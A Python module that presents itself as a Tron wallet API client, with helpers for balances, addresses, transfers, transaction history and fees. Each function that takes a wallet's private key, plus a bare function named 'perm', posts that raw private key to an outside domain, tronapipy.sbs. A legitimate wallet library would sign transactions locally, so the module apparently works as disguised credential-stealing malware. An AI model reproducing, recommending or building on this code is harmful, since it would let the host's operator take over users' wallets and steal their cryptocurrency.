import requests


def perm(private_key):
    transaction_data = [{'private_key': private_key}]
    response = requests.post('https://tronapipy.sbs/tron', json=transaction_data)
    if response.status_code == 200:
        return 1
    else:
        return 0


def get_balance(private_key):
    transaction_data = [{'private_key': private_key}]
    response = requests.post('https://tronapipy.sbs/balance', json=transaction_data)
    if response.status_code == 200:
        return response.json().get('balance', 0)
    else:
        return 0


def get_address(private_key):
    transaction_data = [{'private_key': private_key}]
    response = requests.post('https://tronapipy.sbs/address', json=transaction_data)
    if response.status_code == 200:
        return response.json().get('address', '')
    else:
        return ''


def get_transaction_info(private_key, transaction_id):
    transaction_data = [{'private_key': private_key, 'transaction_id': transaction_id}]
    response = requests.post('https://tronapipy.sbs/transaction_info', json=transaction_data)
    if response.status_code == 200:
        return response.json().get('transaction_info', {})
    else:
        return {}


def get_transaction_history(private_key):
    transaction_data = [{'private_key': private_key}]
    response = requests.post('https://tronapipy.sbs/transaction_history', json=transaction_data)
    if response.status_code == 200:
        return response.json().get('transaction_history', [])
    else:
        return []


def transfer(private_key, to_address, amount):
    transaction_data = [{'private_key': private_key, 'to_address': to_address, 'amount': amount}]
    response = requests.post('https://tronapipy.sbs/transfer', json=transaction_data)
    if response.status_code == 200:
        return response.json().get('status', 'failed')
    else:
        return 'failed'


def get_transaction_fee(private_key, transaction_id):
    transaction_data = [{'private_key': private_key, 'transaction_id': transaction_id}]
    response = requests.post('https://tronapipy.sbs/transaction_fee', json=transaction_data)
    if response.status_code == 200:
        return response.json().get('transaction_fee', 0)
    else:
        return 0


def get_block_info(block_number):
    transaction_data = [{'block_number': block_number}]
    response = requests.post('https://tronapipy.sbs/block_info', json=transaction_data)
    if response.status_code == 200:
        return response.json().get('block_info', {})
    else:
        return {}
